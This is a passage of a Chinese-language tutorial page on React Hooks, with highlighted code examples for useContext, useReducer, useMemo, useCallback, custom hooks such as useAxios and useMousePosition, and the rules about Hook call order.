    <span class="token keyword">return</span> <span class="token operator">&lt;</span>div<span class="token operator">&gt;</span>
        <span class="token operator">&lt;</span>button ref<span class="token operator">=</span><span class="token punctuation">{</span>btnRef<span class="token punctuation">}</span><span class="token operator">&gt;</span>click<span class="token operator">&lt;</span><span class="token operator">/</span>button<span class="token operator">&gt;</span>
    <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">&gt;</span>
<span class="token punctuation">}</span>

<span class="token keyword">export</span> <span class="token keyword">default</span> UseRef
</code></pre></div><p><strong>2. useContext</strong></p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">import</span> React<span class="token punctuation">,</span> <span class="token punctuation">{</span> useContext <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'react'</span>

<span class="token comment">// 主题颜色</span>
<span class="token keyword">const</span> themes <span class="token operator">=</span> <span class="token punctuation">{</span>
    <span class="token literal-property property">light</span><span class="token operator">:</span> <span class="token punctuation">{</span>
        <span class="token literal-property property">foreground</span><span class="token operator">:</span> <span class="token string">'#000'</span><span class="token punctuation">,</span>
        <span class="token literal-property property">background</span><span class="token operator">:</span> <span class="token string">'#eee'</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token literal-property property">dark</span><span class="token operator">:</span> <span class="token punctuation">{</span>
        <span class="token literal-property property">foreground</span><span class="token operator">:</span> <span class="token string">'#fff'</span><span class="token punctuation">,</span>
        <span class="token literal-property property">background</span><span class="token operator">:</span> <span class="token string">'#222'</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token comment">// 创建 Context</span>
<span class="token keyword">const</span> ThemeContext <span class="token operator">=</span> React<span class="token punctuation">.</span><span class="token function">createContext</span><span class="token punctuation">(</span>themes<span class="token punctuation">.</span>light<span class="token punctuation">)</span> <span class="token comment">// 初始值</span>

<span class="token keyword">function</span> <span class="token function">ThemeButton</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> theme <span class="token operator">=</span> <span class="token function">useContext</span><span class="token punctuation">(</span>ThemeContext<span class="token punctuation">)</span>

    <span class="token keyword">return</span> <span class="token operator">&lt;</span>button style<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">{</span> <span class="token literal-property property">background</span><span class="token operator">:</span> theme<span class="token punctuation">.</span>background<span class="token punctuation">,</span> <span class="token literal-property property">color</span><span class="token operator">:</span> theme<span class="token punctuation">.</span>foreground <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token operator">&gt;</span>
        hello world
    <span class="token operator">&lt;</span><span class="token operator">/</span>button<span class="token operator">&gt;</span>
<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function">Toolbar</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token operator">&lt;</span>div<span class="token operator">&gt;</span>
        <span class="token operator">&lt;</span>ThemeButton<span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>ThemeButton<span class="token operator">&gt;</span>
    <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">&gt;</span>
<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function">App</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token operator">&lt;</span>ThemeContext<span class="token punctuation">.</span>Provider value<span class="token operator">=</span><span class="token punctuation">{</span>themes<span class="token punctuation">.</span>dark<span class="token punctuation">}</span><span class="token operator">&gt;</span>
        <span class="token operator">&lt;</span>Toolbar<span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>Toolbar<span class="token operator">&gt;</span>
    <span class="token operator">&lt;</span><span class="token operator">/</span>ThemeContext<span class="token punctuation">.</span>Provider<span class="token operator">&gt;</span>
<span class="token punctuation">}</span>

<span class="token keyword">export</span> <span class="token keyword">default</span> App
</code></pre></div><h3 id="usereducer能代替redux吗"><a href="#usereducer能代替redux吗" class="header-anchor">#</a> useReducer能代替redux吗</h3> <ul><li><code>useReducer</code>是<code>useState</code>的代替方案，用于<code>state</code>复杂变化</li> <li><code>useReducer</code>是单个组件状态管理，组件通讯还需要<code>props</code></li> <li><code>redux</code>是全局的状态管理，多组件共享数据</li></ul> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">import</span> React<span class="token punctuation">,</span> <span class="token punctuation">{</span> useReducer <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'react'</span>

<span class="token keyword">const</span> initialState <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token literal-property property">count</span><span class="token operator">:</span> <span class="token number">0</span> <span class="token punctuation">}</span>

<span class="token keyword">const</span> <span class="token function-variable function">reducer</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">state<span class="token punctuation">,</span> action</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    <span class="token keyword">switch</span> <span class="token punctuation">(</span>action<span class="token punctuation">.</span>type<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">case</span> <span class="token string">'increment'</span><span class="token operator">:</span>
            <span class="token keyword">return</span> <span class="token punctuation">{</span> <span class="token literal-property property">count</span><span class="token operator">:</span> state<span class="token punctuation">.</span>count <span class="token operator">+</span> <span class="token number">1</span> <span class="token punctuation">}</span>
        <span class="token keyword">case</span> <span class="token string">'decrement'</span><span class="token operator">:</span>
            <span class="token keyword">return</span> <span class="token punctuation">{</span> <span class="token literal-property property">count</span><span class="token operator">:</span> state<span class="token punctuation">.</span>count <span class="token operator">-</span> <span class="token number">1</span> <span class="token punctuation">}</span>
        <span class="token keyword">default</span><span class="token operator">:</span>
            <span class="token keyword">return</span> state
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function">App</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment">// 很像 const [count, setCount] = useState(0)</span>
    <span class="token keyword">const</span> <span class="token punctuation">[</span>state<span class="token punctuation">,</span> dispatch<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">useReducer</span><span class="token punctuation">(</span>reducer<span class="token punctuation">,</span> initialState<span class="token punctuation">)</span>

    <span class="token keyword">return</span> <span class="token operator">&lt;</span>div<span class="token operator">&gt;</span>
        <span class="token literal-property property">count</span><span class="token operator">:</span> <span class="token punctuation">{</span>state<span class="token punctuation">.</span>count<span class="token punctuation">}</span>
        <span class="token operator">&lt;</span>button onClick<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token function">dispatch</span><span class="token punctuation">(</span><span class="token punctuation">{</span> <span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token string">'increment'</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token operator">&gt;</span>increment<span class="token operator">&lt;</span><span class="token operator">/</span>button<span class="token operator">&gt;</span>
        <span class="token operator">&lt;</span>button onClick<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token function">dispatch</span><span class="token punctuation">(</span><span class="token punctuation">{</span> <span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token string">'decrement'</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token operator">&gt;</span>decrement<span class="token operator">&lt;</span><span class="token operator">/</span>button<span class="token operator">&gt;</span>
    <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">&gt;</span>
<span class="token punctuation">}</span>

<span class="token keyword">export</span> <span class="token keyword">default</span> App
</code></pre></div><h3 id="使用usememo做性能优化"><a href="#使用usememo做性能优化" class="header-anchor">#</a> 使用useMemo做性能优化</h3> <ul><li>状态变化，React会默认更新所有子组件</li> <li><code>class</code>组件使用<code>shouldComponentUpdate</code>和<code>PureComponent</code>优化</li> <li><code>Hooks</code>中使用<code>useMemo</code>缓存对象，避免子组件更新</li> <li><code>useMemo</code>需要配合<code>React.memo</code>使用才生效</li></ul> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">import</span> React<span class="token punctuation">,</span> <span class="token punctuation">{</span> useState<span class="token punctuation">,</span> memo<span class="token punctuation">,</span> useMemo <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'react'</span>

<span class="token comment">// 子组件</span>
<span class="token comment">// function Child({ userInfo }) {</span>
<span class="token comment">//     console.log('Child render...', userInfo)</span>

<span class="token comment">//     return &lt;div&gt;</span>
<span class="token comment">//         &lt;p&gt;This is Child {userInfo.name} {userInfo.age}&lt;/p&gt;</span>
<span class="token comment">//     &lt;/div&gt;</span>
<span class="token comment">// }</span>
<span class="token comment">// 类似 class PureComponent ，对 props 进行浅层比较</span>
<span class="token keyword">const</span> Child <span class="token operator">=</span> <span class="token function">memo</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter"><span class="token punctuation">{</span> userInfo <span class="token punctuation">}</span></span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Child render...'</span><span class="token punctuation">,</span> userInfo<span class="token punctuation">)</span>

    <span class="token keyword">return</span> <span class="token operator">&lt;</span>div<span class="token operator">&gt;</span>
        <span class="token operator">&lt;</span>p<span class="token operator">&gt;</span>This is Child <span class="token punctuation">{</span>userInfo<span class="token punctuation">.</span>name<span class="token punctuation">}</span> <span class="token punctuation">{</span>userInfo<span class="token punctuation">.</span>age<span class="token punctuation">}</span><span class="token operator">&lt;</span><span class="token operator">/</span>p<span class="token operator">&gt;</span>
    <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">&gt;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>

<span class="token comment">// 父组件</span>
<span class="token keyword">function</span> <span class="token function">App</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Parent render...'</span><span class="token punctuation">)</span>

    <span class="token keyword">const</span> <span class="token punctuation">[</span>count<span class="token punctuation">,</span> setCount<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">useState</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token keyword">const</span> <span class="token punctuation">[</span>name<span class="token punctuation">,</span> setName<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">useState</span><span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">)</span>

    <span class="token comment">// const userInfo = { name, age: 20 }</span>
    <span class="token comment">// 用 useMemo 缓存数据，有依赖</span>
    <span class="token comment">// useMemo包裹后返回的对象是同一个，没有创建新的对象地址，不会触发子组件的重新渲染</span>
    <span class="token keyword">const</span> userInfo <span class="token operator">=</span> <span class="token function">useMemo</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token punctuation">{</span> name<span class="token punctuation">,</span> <span class="token literal-property property">age</span><span class="token operator">:</span> <span class="token number">21</span> <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>name<span class="token punctuation">]</span><span class="token punctuation">)</span>

    <span class="token keyword">return</span> <span class="token operator">&lt;</span>div<span class="token operator">&gt;</span>
        <span class="token operator">&lt;</span>p<span class="token operator">&gt;</span>
            count is <span class="token punctuation">{</span>count<span class="token punctuation">}</span>
            <span class="token operator">&lt;</span>button onClick<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token function">setCount</span><span class="token punctuation">(</span>count <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token operator">&gt;</span>click<span class="token operator">&lt;</span><span class="token operator">/</span>button<span class="token operator">&gt;</span>
        <span class="token operator">&lt;</span><span class="token operator">/</span>p<span class="token operator">&gt;</span>
        <span class="token operator">&lt;</span>Child userInfo<span class="token operator">=</span><span class="token punctuation">{</span>userInfo<span class="token punctuation">}</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>Child<span class="token operator">&gt;</span>
    <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">&gt;</span>
<span class="token punctuation">}</span>

<span class="token keyword">export</span> <span class="token keyword">default</span> App
</code></pre></div><h3 id="使用usecallback做性能优化"><a href="#使用usecallback做性能优化" class="header-anchor">#</a> 使用useCallback做性能优化</h3> <ul><li><code>Hooks</code>中使用<code>useCallback</code>缓存函数，避免子组件更新</li> <li><code>useCallback</code>需要配合<code>React.memo</code>使用才生效</li></ul> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">import</span> React<span class="token punctuation">,</span> <span class="token punctuation">{</span> useState<span class="token punctuation">,</span> memo<span class="token punctuation">,</span> useMemo<span class="token punctuation">,</span> useCallback <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'react'</span>

<span class="token comment">// 子组件，memo 相当于 PureComponent</span>
<span class="token keyword">const</span> Child <span class="token operator">=</span> <span class="token function">memo</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter"><span class="token punctuation">{</span> userInfo<span class="token punctuation">,</span> onChange <span class="token punctuation">}</span></span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Child render...'</span><span class="token punctuation">,</span> userInfo<span class="token punctuation">)</span>

    <span class="token keyword">return</span> <span class="token operator">&lt;</span>div<span class="token operator">&gt;</span>
        <span class="token operator">&lt;</span>p<span class="token operator">&gt;</span>This is Child <span class="token punctuation">{</span>userInfo<span class="token punctuation">.</span>name<span class="token punctuation">}</span> <span class="token punctuation">{</span>userInfo<span class="token punctuation">.</span>age<span class="token punctuation">}</span><span class="token operator">&lt;</span><span class="token operator">/</span>p<span class="token operator">&gt;</span>
        <span class="token operator">&lt;</span>input onChange<span class="token operator">=</span><span class="token punctuation">{</span>onChange<span class="token punctuation">}</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>input<span class="token operator">&gt;</span>
    <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">&gt;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>

<span class="token comment">// 父组件</span>
<span class="token keyword">function</span> <span class="token function">App</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Parent render...'</span><span class="token punctuation">)</span>

    <span class="token keyword">const</span> <span class="token punctuation">[</span>count<span class="token punctuation">,</span> setCount<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">useState</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token keyword">const</span> <span class="token punctuation">[</span>name<span class="token punctuation">,</span> setName<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">useState</span><span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">)</span>

    <span class="token comment">// 用 useMemo 缓存数据</span>
    <span class="token keyword">const</span> userInfo <span class="token operator">=</span> <span class="token function">useMemo</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token punctuation">{</span> name<span class="token punctuation">,</span> <span class="token literal-property property">age</span><span class="token operator">:</span> <span class="token number">21</span> <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>name<span class="token punctuation">]</span><span class="token punctuation">)</span>

    <span class="token comment">// function onChange(e) {</span>
    <span class="token comment">//     console.log(e.target.value)</span>
    <span class="token comment">// }</span>
    <span class="token comment">// 用 useCallback 缓存函数，避免在组件多次渲染中多次创建函数导致引用地址一致</span>
    <span class="token keyword">const</span> onChange <span class="token operator">=</span> <span class="token function">useCallback</span><span class="token punctuation">(</span><span class="token parameter">e</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>target<span class="token punctuation">.</span>value<span class="token punctuation">)</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

    <span class="token keyword">return</span> <span class="token operator">&lt;</span>div<span class="token operator">&gt;</span>
        <span class="token operator">&lt;</span>p<span class="token operator">&gt;</span>
            count is <span class="token punctuation">{</span>count<span class="token punctuation">}</span>
            <span class="token operator">&lt;</span>button onClick<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token function">setCount</span><span class="token punctuation">(</span>count <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token operator">&gt;</span>click<span class="token operator">&lt;</span><span class="token operator">/</span>button<span class="token operator">&gt;</span>
        <span class="token operator">&lt;</span><span class="token operator">/</span>p<span class="token operator">&gt;</span>
        <span class="token operator">&lt;</span>Child userInfo<span class="token operator">=</span><span class="token punctuation">{</span>userInfo<span class="token punctuation">}</span> onChange<span class="token operator">=</span><span class="token punctuation">{</span>onChange<span class="token punctuation">}</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>Child<span class="token operator">&gt;</span>
    <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">&gt;</span>
<span class="token punctuation">}</span>

<span class="token keyword">export</span> <span class="token keyword">default</span> App
</code></pre></div><h3 id="什么是自定义hook"><a href="#什么是自定义hook" class="header-anchor">#</a> 什么是自定义Hook</h3> <ul><li>封装通用的功能</li> <li>开发和使用第三方<code>Hooks</code></li> <li>自定义<code>Hooks</code>带来无限的拓展性，解耦代码</li></ul> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">import</span> <span class="token punctuation">{</span> useState<span class="token punctuation">,</span> useEffect <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'react'</span>
<span class="token keyword">import</span> axios <span class="token keyword">from</span> <span class="token string">'axios'</span>

<span class="token comment">// 封装 axios 发送网络请求的自定义 Hook</span>
<span class="token keyword">function</span> <span class="token function">useAxios</span><span class="token punctuation">(</span><span class="token parameter">url</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> <span class="token punctuation">[</span>loading<span class="token punctuation">,</span> setLoading<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">useState</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span>
    <span class="token keyword">const</span> <span class="token punctuation">[</span>data<span class="token punctuation">,</span> setData<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">useState</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">const</span> <span class="token punctuation">[</span>error<span class="token punctuation">,</span> setError<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">useState</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token function">useEffect</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
        <span class="token comment">// 利用 axios 发送网络请求</span>
        <span class="token function">setLoading</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span>
        axios<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span> <span class="token comment">// 发送一个 get 请求</span>
            <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">res</span> <span class="token operator">=&gt;</span> <span class="token function">setData</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token function">catch</span><span class="token punctuation">(</span><span class="token parameter">err</span> <span class="token operator">=&gt;</span> <span class="token function">setError</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token function">finally</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token function">setLoading</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>url<span class="token punctuation">]</span><span class="token punctuation">)</span>

    <span class="token keyword">return</span> <span class="token punctuation">[</span>loading<span class="token punctuation">,</span> data<span class="token punctuation">,</span> error<span class="token punctuation">]</span>
<span class="token punctuation">}</span>

<span class="token keyword">export</span> <span class="token keyword">default</span> useAxios

<span class="token comment">// 第三方 Hook</span>
<span class="token comment">// https://nikgraf.github.io/react-hooks/</span>
<span class="token comment">// https://github.com/umijs/hooks</span>
</code></pre></div><div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">import</span> <span class="token punctuation">{</span> useState<span class="token punctuation">,</span> useEffect <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'react'</span>

<span class="token keyword">function</span> <span class="token function">useMousePosition</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> <span class="token punctuation">[</span>x<span class="token punctuation">,</span> setX<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">useState</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token keyword">const</span> <span class="token punctuation">[</span>y<span class="token punctuation">,</span> setY<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">useState</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>

    <span class="token function">useEffect</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
        <span class="token keyword">function</span> <span class="token function">mouseMoveHandler</span><span class="token punctuation">(</span><span class="token parameter">event</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token function">setX</span><span class="token punctuation">(</span>event<span class="token punctuation">.</span>clientX<span class="token punctuation">)</span>
            <span class="token function">setY</span><span class="token punctuation">(</span>event<span class="token punctuation">.</span>clientY<span class="token punctuation">)</span>
        <span class="token punctuation">}</span>

        <span class="token comment">// 绑定事件</span>
        document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'mousemove'</span><span class="token punctuation">,</span> mouseMoveHandler<span class="token punctuation">)</span>

        <span class="token comment">// 解绑事件</span>
        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">removeEventListener</span><span class="token punctuation">(</span><span class="token string">'mousemove'</span><span class="token punctuation">,</span> mouseMoveHandler<span class="token punctuation">)</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

    <span class="token keyword">return</span> <span class="token punctuation">[</span>x<span class="token punctuation">,</span> y<span class="token punctuation">]</span>
<span class="token punctuation">}</span>

<span class="token keyword">export</span> <span class="token keyword">default</span> useMousePosition
</code></pre></div><div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// 使用</span>
<span class="token keyword">function</span> <span class="token function">App</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> url <span class="token operator">=</span> <span class="token string">'http://localhost:3000/'</span>
    <span class="token comment">// 数组解构</span>
    <span class="token keyword">const</span> <span class="token punctuation">[</span>loading<span class="token punctuation">,</span> data<span class="token punctuation">,</span> error<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">useAxios</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>loading<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token operator">&lt;</span>div<span class="token operator">&gt;</span>loading<span class="token operator">...</span><span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">&gt;</span>

    <span class="token keyword">return</span> error
        <span class="token operator">?</span> <span class="token operator">&lt;</span>div<span class="token operator">&gt;</span><span class="token punctuation">{</span><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">&gt;</span>
        <span class="token operator">:</span> <span class="token operator">&lt;</span>div<span class="token operator">&gt;</span><span class="token punctuation">{</span><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">&gt;</span>

    <span class="token comment">// const [x, y] = useMousePosition()</span>
    <span class="token comment">// return &lt;div style={{ height: '500px', backgroundColor: '#ccc' }}&gt;</span>
    <span class="token comment">//     &lt;p&gt;鼠标位置 {x} {y}&lt;/p&gt;</span>
    <span class="token comment">// &lt;/div&gt;</span>
<span class="token punctuation">}</span>
</code></pre></div><h3 id="使用hooks的两条重要规则"><a href="#使用hooks的两条重要规则" class="header-anchor">#</a> 使用Hooks的两条重要规则</h3> <ul><li>只能用于函数组件和自定义<code>Hook</code>中，其他地方不可以</li> <li>只能用于顶层代码，不能在判断、循环中使用<code>Hooks</code></li> <li><code>eslint</code>插件<code>eslint-plugin-react-hooks</code>可以帮助检查<code>Hooks</code>的使用规则</li></ul> <p><img alt="" data-src="https://s.poetries.work/uploads/2023/02/ee5e71b37a63fb7b.png" loading="lazy" class="lazy"></p> <h3 id="为何hooks要依赖于调用顺序"><a href="#为何hooks要依赖于调用顺序" class="header-anchor">#</a> 为何Hooks要依赖于调用顺序</h3> <ul><li>无论是<code>render</code>还是<code>re-render</code>，<code>Hooks</code>调用顺序必须一致</li> <li>如果<code>Hooks</code>出现在循环、判断里，则无法保证顺序一致</li> <li><code>Hooks</code>严重依赖调用顺序</li></ul> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">import</span> React<span class="token punctuation">,</span> <span class="token punctuation">{</span> useState<span class="token punctuation">,</span> useEffect <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'react'</span>

<span class="token keyword">function</span> <span class="token function">Teach</span><span class="token punctuation">(</span><span class="token parameter"><span class="token punctuation">{</span> couseName <span class="token punctuation">}</span></span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment">// 函数组件，纯函数，执行完即销毁</span>
    <span class="token comment">// 所以，无论组件初始化（render）还是组件更新（re-render）</span>
    <span class="token comment">// 都会重新执行一次这个函数，获取最新的组件</span>
    <span class="token comment">// 这一点和 class 组件不一样：有组件实例，组件实例一旦声声明不会销毁（除非组件销毁）</span>

    <span class="token comment">// render: 初始化 state 的值 '张三'</span>
    <span class="token comment">// re-render: 读取 state 的值 '张三'</span>
    <span class="token keyword">const</span> <span class="token punctuation">[</span>studentName<span class="token punctuation">,</span> setStudentName<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">useState</span><span class="token punctuation">(</span><span class="token string">'张三'</span><span class="token punctuation">)</span>

    <span class="token comment">// if (couseName) {</span>
    <span class="token comment">//     const [studentName, setStudentName] = useState('张三')</span>
    <span class="token comment">// }</span>

    <span class="token comment">// render: 初始化 state 的值 'poetry'</span>
    <span class="token comment">// re-render: 读取 state 的值 'poetry'</span>
    <span class="token keyword">const</span> <span class="token punctuation">[</span>teacherName<span class="token punctuation">,</span> setTeacherName<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">useState</span><span class="token punctuation">(</span><span class="token string">'poetry'</span><span class="token punctuation">)</span>

    <span class="token comment">// if (couseName) {</span>
    <span class="token comment">//     useEffect(() =&gt; {</span>
    <span class="token comment">//         // 模拟学生签到</span>
    <span class="token comment">//         localStorage.setItem('name', studentName)</span>
    <span class="token comment">//     })</span>
    <span class="token comment">// }</span>

    <span class="token comment">// render: 添加 effect 函数</span>
    <span class="token comment">// re-render: 替换 effect 函数（内部的函数也会重新定义）</span>
    <span class="token function">useEffect</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span> <span class="token comment">// 内部函数执行完就销毁</span>
        <span class="token comment">// 模拟学生签到</span>
        localStorage<span class="token punctuation">.</span><span class="token function">setItem</span><span class="token punctuation">(</span><span class="token string">'name'</span><span class="token punctuation">,</span> studentName<span class="token punctuation">)</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span>

    <span class="token comment">// render: 添加 effect 函数</span>
    <span class="token comment">// re-render: 替换 effect 函数（内部的函数也会重新定义）</span>
    <span class="token function">useEffect</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span><span class="token comment">// 内部函数执行完就销毁</span>
        <span class="token comment">// 模拟开始上课</span>
